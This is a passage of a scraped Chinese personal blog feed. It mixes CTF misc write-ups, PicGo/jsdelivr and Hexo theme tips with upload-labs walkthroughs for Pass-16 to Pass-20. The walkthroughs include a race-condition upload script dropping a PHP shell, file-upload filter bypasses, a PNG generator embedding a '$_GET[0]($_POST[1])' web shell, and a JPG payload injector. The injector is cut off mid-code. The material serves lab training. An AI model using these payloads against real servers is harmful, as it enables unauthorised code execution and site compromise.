9566a6a6aa6 就百度曼切斯特编码解码，找到一篇博客：一些CTF编码脚本，在里面找到了这两段：\n心里一顿狂喜，因为都是2965a这个几个字符组成的，应该就是找对了。根据博客代码自行修改脚本\n1 2 3 4 5 6 7 8 9 10 11 import sys s = \u0026#39;296969a56956696a6a9a695669595a566965696666aa69596a9666aa6a6569955a5a66aa69a569566a6a6aa6\u0026#39; #这是前面图片里的内容 s=bin(int(s,16)) r=\u0026#34;\u0026#34; for i in range(len(s)/2): if s[i*2:i*2+2] == \u0026#39;10\u0026#39;: r += \u0026#39;1\u0026#39; else: r += \u0026#39;0\u0026#39; print hex(int(r,2))[2:-1].decode(\u0026#39;hex\u0026#39;) 执行脚本后获得flag：flag{ab1de_by_th3_law}\nSteghide 题目即工具。参考博客隐写工具Steghide，在kali中安装Steghide后执行：\n1 steghide.exe extract -sf trump.jpg 会提示Enter passphrase:直接回车表示空密码，获得flag.txt，打开以后里面都是由¿ ¡ .组成的密文，和Ook的另一种编码：short Ook类似也是只用? ! .组成，把叹号和问号全部替换反过来¡---\u0026gt;! ¿---\u0026gt;?，替换之后在线解码：https://www.splitbrain.org/services/ook，获得flag：flag{y0u_ar3_clev3r}\nSSTV 题目既是工具。搜索SSTV百度百科：\n慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。\n了解到是一种无线电传递图片的方法，搜到的博客慢扫描电视 SSTV和B站的视频慢扫描电视SSTV，下载MMSSTV软件，把output.wav音频调制麦克风输出，我使用的方法是在声音设置里把立体声混音打开并且设为默认设备，然后电脑里播放的声音就会被录制到。等待图片绘制成功，获得flag：DMCTF{SSTV,yyds?}\nSimpleQrcode ​\t下载题目是一个gif图片都是二维码，使用使用stegSovle中的Frame Browser功能，一帧一帧播放，一帧一扫，有几帧图片是少了二维码的上边，有一张是少了右边，可以参考第一张完整的图片，把上面截取拼接上去，扫码后17张图片对应的内容（根据代码行号）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 DM CT F{ Qr Co de _1 s_ so _i nt er es ti ng !! !} 参考下题目标题和flag格式，拼接后获得flag：DMCTF{QrCode_1s_so_interesting!!!}\n","date":"2020-12-01T11:20:45Z","permalink":"https://www.braindance.top/articles/2020/12/dmctf%E4%B9%8Bmisc/","title":"DMCTF之Misc"},{"content":"2022年2月3日22:41:32\n！！！！！\n建议直接看文章末尾，我发现我就是个笨比。\n前言 现在博客里面的图片使用的是github+jsdelivr+PicGo图床。PicGo是一个开源的上传图片的软件，支持大部分图床的上传，只需要设置对应的图床参数即可一键上传。github上PicGo的概述：\nPicGo: 一个用于快速上传图片并获取图片 URL 链接的工具\nPicGo 本体支持如下图床：\n七牛图床 v1.0 腾讯云 COS v4\\v5 版本 v1.1 \u0026amp; v1.5.0 又拍云 v1.2.0 GitHub v1.5.0 SM.MS V2 v2.3.0-beta.0 阿里云 OSS v1.6.0 Imgur v1.6.0 本体不再增加默认的图床支持。你可以自行开发第三方图床插件。\n项目地址：PicGo\n软件界面：\n起因 PicGo上传成功以后可以自动复制url，但是默认复制的图片链接是github提供的，github在国内又经常抽风，图片通常都是无法访问的，所以我使用了jsdelivr提供的链接访问图片，PicGo也提供了自定义链接，但是规定必须包含$url参数，也就是默认的url地址：\n起初是把jsdelivr的链接直接拼在后面，每次使用的时候都再删一次。直到昨晚受不了了就尝试去修改软件试图绕过判断。\n解决方法 在软件设置的配置文件里找到了customLink，和之前自己设置的链接对照了一下，认为这个就是实际的自定义链接，直接在此处修改，再上传自动复制的链接就正确了，而且绕过了必须包含$url。\n结语 软件提供了自动使用时间戳重命名，所以我自定义链接中还是使用了$filename变量，然后博客中的图片大部分都是使用QQ的截屏功能，出来的截图后缀都是png格式，这个可以根据需要自己设定拼接，然后使用的markdown编辑器是typora，想要添加图片直接Crtl+Shift+i，把图片链接贴里面就彳亍了。~白嫖真爽\n2022-1-31 11:43:48\n这时候发现自定义链接直接用markdown格式就更好了\n1 ![$fileName](https://cdn.jsdelivr.net/gh/username/repo@master/artical/$fileName.png) 最简单修改 前面的都是我在改自定义链接，至少明白了可以绕过自定义链接必须包含变量名称这个限制。\n直接在自定义域名那里修改成jsDeliver对应的仓库路径，比如我的\n1 https://cdn.jsdelivr.net/gh/penginman/PicBed@master 然后返回的链接就会把原来的raw.github.com/xxxxxx给替代了。\n","date":"2020-11-30T09:54:11Z","permalink":"https://www.braindance.top/articles/2020/11/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/","title":"PicGo复制自定义链接"},{"content":"前言 ​\t上一篇修改了黑幕，但是使用了jsdelivr加速的静态资源，所以照常更新下github上的资源，但是github上查看已经上传成功了，jsdelivr访问的依然是之前的资源，说白了就是缓存的问题。即使本地浏览器端的缓存已经清理，也会因为CDN周围的节点没有同步数据而导致用户端未能及时更新。\n缓存刷新 把原来访问的链接\nhttps://cdn.jsdelivr.net/...\n改为\nhttps://purge.jsdelivr.net/...\n访问资源就会进行刷新，然后页面会返回刷新信息：\n划水收工。\n","date":"2020-11-20T22:02:46Z","permalink":"https://www.braindance.top/articles/2020/11/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/","title":"jsdelivr 缓存刷新"},{"content":"前言 ​\t老早就觉得萌娘百科里的\u0026lt;span class='heimu'\u0026gt;黑幕\u0026lt;/span\u0026gt;很好玩，所以摸索着给自己博客加了一个。参考博客Re：萌娘百科上的黑幕实现。不过我改的方法有稍稍有点不同，是把hexo渲染markdown文章中的删除线~~ ~~标签修改了。我回来又想到了更好的方法，markdown支持文章中的自定义标签，自己增加一个\u0026lt;span class='heimu'\u0026gt;...\u0026lt;/span\u0026gt;标签更好。那么两种都记一下吧。当然用自定义标签的话还可以保留删除线。\n示例 1 2 3 4 5 \u0026lt;span class=\u0026#39;heimu\u0026#39;\u0026gt;我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#39;heimu\u0026#39;\u0026gt;我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#39;heimu\u0026#39;\u0026gt;~~我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气~~\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#39;heimu\u0026#39;\u0026gt;**我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气**\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#39;heimu\u0026#39;\u0026gt;我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气`\u0026lt;/span\u0026gt; 原博客图\n萌娘百科官方介绍\n准备工作 ​\t先进入主题的资源文件夹themes\\butterfly\\source\\，修改需要用到的文件css\\_global\\index.styl、js/main.js。\n​\t说明一下两个文件的作用：主题的总样式表index.css是经过整合形成的，而**.styl文件是基于Node.js的CSS的预处理框架**，我们会在这个里面添加黑幕的样式。main.js里面使用选择器为标签添加title='你知道的太多了'，这个可以修改成自己喜欢的。\n修改自定义标签 在index.styl文件末尾添加 1 2 3 4 5 6 7 8 9 10 11 12 13 .heimu, .heimu a, a .heimu, .heimu a.new, .heimu code background-color: #252525 !important color: #252525 !important text-shadow: none .heimu:hover, .heimu:active, .heimu:hover .heimu, .heimu:active .heimu,.heimu code:hover color: white !important; .heimu:hover a, a:hover .heimu, .heimu:active a, a:active .heimu color: lightblue !important; .heimu:hover .new, .heimu .new:hover, .new:hover .heimu, .heimu:active .new, .heimu .new:active, .new:active .heimu color: #BA0000 !important; 因为是.styl的文件，缩进是很严格的，自行按照前面缩进来整理一下。上面那么多就是兼容了一下黑幕下的超链接、粗体、代码块。主要是超链接。\n在main.js的unRefreshFn和refreshFn方法之前定义addheimuTitle函数 1 2 3 4 5 //你知道的太多了 const addheimuTitle = function(){ console.log(123) $(\u0026#39;.heimu\u0026#39;).attr(\u0026#39;title\u0026#39;,\u0026#39;你知道的太多了\u0026#39;) } 可以ctrl+f搜索上面那两个..refreshFn函数，发现是整个JS中函数调用的入口，所以我们也需要把自己定义的addheimuTitle函数在这里面调用。我盲猜的嗷refreshFn这个函数是在载入页面会调用，直接在里面第二行加上\n修改删除线 ​\t修改css\\_layout\\post.styl文件，在文件中找到id为#article-container的元素，这个元素是文章页面中最外层的元素，我们需要在它里面添加\n1 2 3 4 5 6 7 8 9 10 #article-container ..... ..... del background-color: #252525; color: #252525; text-shadow: none; text-decoration: none \u0026amp;:hover color: white !important; ​\t因为文章中的删除线被渲染以后页面的标签为\u0026lt;del\u0026gt;，选中id为article-container下的所有del标签添加样式，剩下的还有在main.js中添加title和上面的方法差不多，只需要把选择器修改为$('#article-container del').attr('title','你知道的太多了')。\n完工 ​\t两种方法比较下，第一种方法可以保留删除线，但是在写文章时需要再手打一遍标签，第二种方法直接借用删除线，能省事但是删除线就用不了了。我用的第一种。\n","date":"2020-11-20T10:13:07Z","permalink":"https://www.braindance.top/articles/2020/11/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/","title":"萌娘百科黑幕实现"},{"content":"Pass-17 ​\t（windows环境，php版本5.2.17，题号是18题）\n源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $is_upload = false; $msg = null; if(isset($_POST[\u0026#39;submit\u0026#39;])){ $ext_arr = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); $file_name = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]; $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $file_ext = substr($file_name,strrpos($file_name,\u0026#34;.\u0026#34;)+1); $upload_file = UPLOAD_PATH . \u0026#39;/\u0026#39; . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39;. rand(10, 99).date(\u0026#34;YmdHis\u0026#34;).\u0026#34;.\u0026#34;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = \u0026#34;只允许上传.jpg|.png|.gif类型文件！\u0026#34;; unlink($upload_file); } }else{ $msg = \u0026#39;上传出错！\u0026#39;; } } ​\t思路和前面的一样，获取文件信息，移动文件到upload文件夹，第12行使用了白名单验证，多了第14行的rename函数，看名称就是重命名的函数，所以我们可以在重命名之前访问我们上传的文件，所以这题用到了上传竞争，使用python脚本不断的向服务器上传文件，然后访问上传的文件，上传的文件中有一句代码\u0026lt;?php fputs(fopen('shell.php','w'),'\u0026lt;?php phpinfo();?\u0026gt;');?\u0026gt;这段代码执行以后，会创建一个名为shell.php里面有一句\u0026lt;?php phpinfo();?\u0026gt;的文件。\n​\t脚本代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #coding=utf-8 import requests from multiprocessing import Pool def CompeteUpload(list): url=\u0026#34;http://upload-labs/Pass-18/index.php\u0026#34; #上传页面 geturl=\u0026#34;http://upload-labs/upload/233.php\u0026#34;\t#访问上传文件 file={\u0026#39;upload_file\u0026#39;:(\u0026#39;233.php\u0026#39;,\u0026#34;\u0026lt;?php fputs(fopen(\u0026#39;shell.php\u0026#39;,\u0026#39;w\u0026#39;),\u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39;);?\u0026gt;\u0026#34;,\u0026#39;image/jpeg\u0026#39;)} data={\u0026#39;submit\u0026#39;:\u0026#39;上传\u0026#39;} r=requests.post(url=url,data=data,files=file) #print \u0026#34;test upload....\u0026#34; r1=requests.get(url=geturl) if r1.status_code==200: print (\u0026#34;upload success!\u0026#34;) if __name__==\u0026#34;__main__\u0026#34;: pool = Pool(10) pool.map(CompeteUpload, range(10000)) pool.close() pool.join() ​\t第一次用python的我在这里知道了pip。这道题因为要不断的上传和访问文件，所以对在线靶场不友好，所以才选择了本地环境解题。完工\nPass-18（失手） ​\t18题失手了没有思路，如果使用include.php文件包含的话还可以，看了看网上大部分的博客都是敷敷衍衍过去的，找到了一篇稍微有点思路的，使用的是apache2.2.x的解析漏洞，这个漏洞的思路就是，apache服务器在解析有多个后缀名的文件时，从最后一个开始向前扫描，如果不认识就跳过，直到遇到一个认识的文件后缀，就把这个文件以这个能识别的后缀解析。\nApache文件解析漏洞\napache httpd多后缀解析漏洞复现\n​\t源码中还有一个可以突破的点是同样使用了重命名函数，所以应该还是可以使用竞争上传访问得到，但是使用了白名单验证，我实在是没招了所以先摸为敬。\nPass-19 （windows环境，php5.2.17，magic_quotes_gpc=Off）\n源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;php\u0026#34;,\u0026#34;php5\u0026#34;,\u0026#34;php4\u0026#34;,\u0026#34;php3\u0026#34;,\u0026#34;php2\u0026#34;,\u0026#34;html\u0026#34;,\u0026#34;htm\u0026#34;,\u0026#34;phtml\u0026#34;,\u0026#34;pht\u0026#34;,\u0026#34;jsp\u0026#34;,\u0026#34;jspa\u0026#34;,\u0026#34;jspx\u0026#34;,\u0026#34;jsw\u0026#34;,\u0026#34;jsv\u0026#34;,\u0026#34;jspf\u0026#34;,\u0026#34;jtml\u0026#34;,\u0026#34;asp\u0026#34;,\u0026#34;aspx\u0026#34;,\u0026#34;asa\u0026#34;,\u0026#34;asax\u0026#34;,\u0026#34;ascx\u0026#34;,\u0026#34;ashx\u0026#34;,\u0026#34;asmx\u0026#34;,\u0026#34;cer\u0026#34;,\u0026#34;swf\u0026#34;,\u0026#34;htaccess\u0026#34;); $file_name = $_POST[\u0026#39;save_name\u0026#39;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = \u0026#39;上传出错！\u0026#39;; } }else{ $msg = \u0026#39;禁止保存为该类型文件！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } ​\t源码第七行使用了POST来接受文件的命名，前面有类似题的是使用了0x00截断上传，后面也同样是move_uploaded_file移动文件的函数，还使用了黑名单验证，方法就很明确，使用截断上传。别忘了截断上传需要的特定条件：php版本需要低于5.3.29、magic_quotes_gpc需要为关闭状态。\n​\t同样是命名为phpa方便在十六进制表里修改为00\n​\t打开图片把url链接http://upload-labs/upload/upload-19.php�修改一下即可。完工\n​\t其实这道题还有一个思路，因为题目使用了黑名单验证，分析源码没有设置大小写过滤，所以也可以使用大小写方法通过如Php，不演示了。\nPass-20 （LInux环境，php7.2.21）\n源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 $is_upload = false; $msg = null; if(!empty($_FILES[\u0026#39;upload_file\u0026#39;])){ //检查MIME $allow_type = array(\u0026#39;image/jpeg\u0026#39;,\u0026#39;image/png\u0026#39;,\u0026#39;image/gif\u0026#39;); if(!in_array($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;],$allow_type)){ $msg = \u0026#34;禁止上传该类型文件!\u0026#34;; }else{ //检查文件名 $file = empty($_POST[\u0026#39;save_name\u0026#39;]) ? $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;] : $_POST[\u0026#39;save_name\u0026#39;]; if (!is_array($file)) { $file = explode(\u0026#39;.\u0026#39;, strtolower($file)); } $ext = end($file); $allow_suffix = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); if (!in_array($ext, $allow_suffix)) { $msg = \u0026#34;禁止上传该后缀文件!\u0026#34;; }else{ $file_name = reset($file) . \u0026#39;.\u0026#39; . $file[count($file) - 1]; $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = \u0026#34;文件上传成功！\u0026#34;; $is_upload = true; } else { $msg = \u0026#34;文件上传失败！\u0026#34;; } } } }else{ $msg = \u0026#34;请选择要上传的文件！\u0026#34;; } ​\t这道题使用了MIME验证和白名单验证。先看第10行使用了三目运算符判断$_POST['save_name']是否为空，若为空则执行:前获取上传文件的名称，若不为空则获取POST中的save_name。第11行使用了is_array函数判断是否是一个数组，然后使用explode截断文件名转换小写并返回数组。也就是说，如果我们POST中的save_name是个数组的就可以跳过11行的判断。15行使用end函数获取数组中的最后一个元素用于后缀验证。20行把文件名进行拼接：数组第一个元素+数组元素总数-1的那个元素。\n所以我们可以构造一个这样的数组用于绕过：\n​\t数组[2]用于绕过白名单，文件名为：数组[0].数组[1]，但是数组[1]是空的所以只剩下数组[0].（后面有个点）\n​\t别忘了还要绕过MIME\n完工\n最后 ​\tUpload labs的20道题大部分完成了，有两道题没完成，但是也学到了不少东西，这些天再抽空写一个总结吧。射射观看。\n","date":"2020-11-19T08:47:19Z","permalink":"https://www.braindance.top/articles/2020/11/upload-labs%E7%9A%84%E6%9C%80%E5%90%8E%E5%87%A0%E9%81%93%E9%A2%98/","title":"Upload-Labs的最后几道题"},{"content":"前言 ​\t我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。\n​\t参考博客：upload-labs之pass 16详细分析\nPass-16 ​\t源码（三种图片的判定，只贴一个吧，篇幅小一点）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]; $filetype = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;]; $tmpname = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $target_path=UPLOAD_PATH.\u0026#39;/\u0026#39;.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\u0026#34;.\u0026#34;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \u0026#34;jpg\u0026#34;) \u0026amp;\u0026amp; ($filetype==\u0026#34;image/jpeg\u0026#34;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = \u0026#34;该文件不是jpg格式的图片！\u0026#34;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\u0026#34;.jpg\u0026#34;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \u0026#34;上传出错！\u0026#34;; } }else if(($fileext == \u0026#34;png\u0026#34;) \u0026amp;\u0026amp; ($filetype==\u0026#34;image/png\u0026#34;)){ ...... }else if(($fileext == \u0026#34;gif\u0026#34;) \u0026amp;\u0026amp; ($filetype==\u0026#34;image/gif\u0026#34;)){ ..... }else{ $msg = \u0026#34;只允许上传后缀为.jpg|.png|.gif的图片文件！\u0026#34;; } } ​\t提示：本pass重新渲染了图片！。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。\n​\t首先是分析一波源码：\n​\t以jpg文件判定为例。获取文件名、类型、临时文件路径，获取文件后缀，进入jpg图片判定，判定的方式是通过文件后缀和文件的类型判定，再执行move_uploaded_file函数先把文件移动到upload文件夹，现在文件路径是$target_path，之后对图片进行二次渲染。\n​\t二次渲染用到了imagecreatefromjpeg函数，官方解释：由文件或 URL 创建一个新图象，返回一图像标识符，代表了从给定的文件名取得的图像（这时候图像对象还是一个空的）。然后判断是否是一个图片文件，如果不是的话执行unlink函数删除文件，否则，为新图片随机一个名称，执行imagejpeg函数把图象输出到新文件 $newfilename。再将之前用户上传的文件$target_path删除掉。\n​\t根据上面的分析就能得出来两种思路：\n访问二次渲染之前的上传的文件。 在图片二次渲染以后图片马未失效。 第一种方法 ​\t（Linux环境、php版本7.2.21）\n​\t因为二次渲染那部分if、else无论如何都会执行unlink函数删除你的文件，需要在执行imagecreatefromjpeg时报错才能访问到自己原来上传的文件。\njpg格式 准备并上传 ​\t需要准备只含有一句话木马的文件并命名为.jpg格式。直接上传。\n文件包含验证 ​\t上传以后我使用的在线靶场网页中题目部分直接消失了，这就说明函数执行过程中出错导致页面也没有正常返回。然后就可以使用inclue.php文件包含访问刚刚上传的文件\n其他格式 ​\t如图成功访问就是图片马上传成功了。但是这个方法我只有jpg格式的文件上传成功了，另外两种格式的图片没有上传成功，这个我感觉需要了解imagecreatefromjpeg、imagecreatefrompng、imagecreatefromgif，这三个函数的原理，让其报错即可。\n第二种方法 ​\t（windows环境，php版本5.2.17）\n​\t这种方法是让图片码在经过二次渲染以后，能保证代码不会被二次渲染给过滤掉。从最简单的一个一个来。\n​\t用到的工具是Beyond Compare 4，是一个文件比较的工具，就是查看图片渲染修改的哪些部分，还可以查看文件的16进制格式。\nGIF格式 准备并上传 ​\t上传一个使用copy /b指令制作的图片马，之前文章第13题用过。假设上传的图片马为yoo.gif，上传成功以后再下载下载的文件名为2119840023.gif。\n文件比较 ​\t使用前面说的Beyond Compare 4工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件相同的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。\u0026lt;?php phpinfo(); ?\u0026gt;的十六进制是3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E直接粘贴插入，在右边框中右键保存文件再进行上传。\n文件包含验证 ​\t上传以后进行文件包含，代码执行成功。\n​\t为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。\npng格式 ​\t这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了\n​\t这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的头标识部分，修改的话就不是png格式图片，更过不了。\n​\t所以我直接看答案了，还是前言里的博客。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。\n​\t所以又出来了两种方法：\n修改CRC码 直接生成图片 计算CRC码 ​\t计算CRC码的python脚本\n1 2 3 4 5 6 7 8 9 10 11 12 import binascii import re png = open(r\u0026#39;1.png\u0026#39;,\u0026#39;rb\u0026#39;) a = png.read() png.close() hexstr = binascii.b2a_hex(a) \u0026#39;\u0026#39;\u0026#39; PLTE crc \u0026#39;\u0026#39;\u0026#39; data = \u0026#39;504c5445\u0026#39;+ re.findall(\u0026#39;504c5445(.*?)49444154\u0026#39;,hexstr)[0] crc = binascii.crc32(data[:-16].decode(\u0026#39;hex\u0026#39;)) \u0026amp; 0xffffffff print hex(crc) 准备 ​\tphp底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分写入代码，再重新计算CRC码，再修改原来的CRC码即可。\n计算CRC码 ​\t脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。\n这个方法我没有尝试，因为我不会python。都2020年了还有人不会python，不会吧不会吧。😒\n等我学会在回来改这一篇吧。\n直接生成图片（写入实际数据模块） ​\t国外大牛的脚本，直接运行就会生成一个图片\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y \u0026lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,\u0026#39;./1.png\u0026#39;); ?\u0026gt; ​\tphp指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为php.exe的可执行文件，它是php提供的一种CLI模式，也就是命令行模式。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。\n​\t还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。\n​\t运行成功以后会找到一个名为1.png的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。\n​\t但是这个生成的图片php代码是\u0026lt;?=$_GET[0]($_POST[1]);?\u0026gt;，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，应该算吧\njpg格式 ​\t同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 ?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php \u0026lt;jpg_name.jpg\u0026gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \u0026#34;Something\u0026#39;s wrong\u0026#34;. If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \u0026#34;\u0026lt;?=phpinfo();?\u0026gt;\u0026#34;; if(!extension_loaded(\u0026#39;gd\u0026#39;) || !function_exists(\u0026#39;imagecreatefromjpeg\u0026#39;)) { die(\u0026#39;php-gd is not installed\u0026#39;); } if(!isset($argv[1])) { die(\u0026#39;php jpg_payload.php \u0026lt;jpg_name.jpg\u0026gt;\u0026#39;); } set_error_handler(\u0026#34;custom_error_handler\u0026#34;); for($pad = 0; $pad \u0026lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-\u0026gt;readShort() != 0xFFD8) { die(\u0026#39;Incorrect SOI marker\u0026#39;); } while((!$dis-\u0026gt;eof()) \u0026amp;\u0026amp; ($dis-\u0026gt;readByte() == 0xFF)) { $marker = $dis-\u0026gt;readByte(); $size = $dis-\u0026gt;readShort() - 2; $dis-\u0026gt;skip($size); if($marker === 0xDA) { $startPos = $dis-\u0026gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(\u0026#39;_\u0026#39;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-\u0026gt;eof())) { if($dis-\u0026gt;readByte() === 0xFF) { if($dis-\u0026gt;readByte !== 0x00) { break; } } } $stopPos = $dis-\u0026gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage(\u0026#39;payload_\u0026#39;.$argv[1], $outStream)) { die(\u0026#39;Success!\u0026#39;); } else { break; } } } } unlink(\u0026#39;payload_\u0026#39;.$argv[1]); die(\u0026#39;Something\\\u0026#39;s wrong\u0026#39;); function 